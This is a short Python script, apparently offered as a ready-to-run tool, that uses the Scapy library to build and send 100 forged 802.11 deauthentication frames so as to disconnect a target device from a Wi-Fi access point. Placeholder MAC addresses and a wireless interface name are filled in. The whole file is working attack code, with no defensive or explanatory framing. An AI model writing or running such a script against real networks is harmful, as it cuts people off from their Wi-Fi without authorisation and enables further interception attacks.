from scapy.all import *

def deauth_attack(target_mac, ap_mac, interface):
    """Perform a deauthentication attack on the target device."""
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.1)  # Send 100 deauth packets

# Example usage
if __name__ == "__main__":
    target_mac = "00:11:22:33:44:55"  # Target device MAC address
    ap_mac = "66:77:88:99:AA:BB"  # Access point MAC address
    interface = "wlan0"  # Network interface
    deauth_attack(target_mac, ap_mac, interface)
